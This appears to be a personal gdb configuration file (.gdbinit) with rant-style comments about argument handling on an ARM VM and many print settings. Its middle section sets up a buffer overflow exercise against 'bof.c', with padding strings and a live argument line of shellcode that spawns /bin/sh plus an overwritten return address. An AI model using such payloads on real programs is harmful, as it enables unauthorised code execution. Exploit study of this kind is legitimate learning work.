# program args
# You have got to be fscking kidding me.  Arm implementation of
# gdb on this debian vm does not work with set args even though
# the command is available.  Someone else had a similar error
# http://stackoverflow.com/questions/31031403/pass-arguments-to-arm-program-while-remotely-debugging
# Ok its even worse.  If you run gdb with args on the gdb command invokation 
# they are not used.  you must set args prior to issuing run
# command. OMFG
# I'm leaving it in there for when I dork with the file on x64
#
# Okay I stand corrected.  It worked the last time.
# 
# And now I figured out why.  if you run normally it works, 
# but if you do a rerun like so run > outfile.txt
# It overwrites the args. Consquently I have added the
# redirect of stdout below.
#

# setups for specific programs
#
# args for bof.c
break main
# for demo to see buffer
# set args $(python2 -c 'print "A" * 300')
# for jump to start of buffer
#set args $(python2 -c 'print "A" * 264 + "\x7f\xff\xff\xff\xe2\x90"[::-1]')
# args which are the result of shell.asm
# we know the buffer is 64 bytes and the hexcode is 57 bytes.  we know the return
# address is the next 8 bytes.  The first two bytes must be zero
# and the next 6 bytes must be the address of buffer.  We know the buffer
# is at 0x7f....de50
# the raw code
#set args '\xeb\x2a\x5f\x48\x89\xe3\x48\x83\xc4\x08\x67\x48\x89\x1c\x24\x48\x89\xe1\x48\x89\xc8\x48\x83\xc0\x04\x48\x31\xd2\x67\x48\x89\x10\x48\x31\xc0\x48\x89\xc2\x48\x83\xc0\x0b\xcd\x80\xe8\xd1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00'
# the working code
set args `printf "\xeb\x2a\x5f\x48\x89\xe3\x48\x83\xc4\x08\x67\x48\x89\x1c\x24\x48\x89\xe1\x48\x89\xc8\x48\x83\xc0\x04\x48\x31\xd2\x67\x48\x89\x10\x48\x31\xc0\x48\x89\xc2\x48\x83\xc0\x0b\xcd\x80\xe8\xd1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x41\x42\x43\x44\x45\x46\x47\x48\x41\x42\x43\x44\x45\x46\x47\x48\x50\xde\xff\xff\xff\x7f"`


#
# setup for testy1
#file testy1
#break 107




# So I don't have to keep doing this by hand.
# Annnd it does not work on the arm implementaton.
# I'm leaving it in there for when I dork with the file on x64
#
# Okay I stand corrected.  It worked the last time.
focus cmd
#layout asm
#layout reg
#layout next
#winheight reg +5
#run
#winheight reg +1
#run


# override pretty print settings
#
# print structures in indented format with one member per line
set print pretty on
#
# print memory addresses
set print address on
#
# print source filename and line number
set print symbol-filename
#
# print symbol corresponding to an addresss, useful when dealing
# with pointers
set print symbol on
#
# pretty print arrays
set print array on
#
# pretty print array indexes
set print array-indexes on
#
# forms for work with the frame command
set print frame-arguments all
#set print frame-arguments scalars
#set print frame-arguments none
#
# forms for function parms values
#set print entry-values no
#set print entry-values only
#set print entry-values preferred
#set print entry-values if-needed
#set print entry-values both
set print entry-values compact
#set print entry-values default









# On the debian vm, this will be the second virt term
# use alt-right_arrow to get to it.
#
# Correction, I never got this working.
# set inferior-tty /dev/tty2
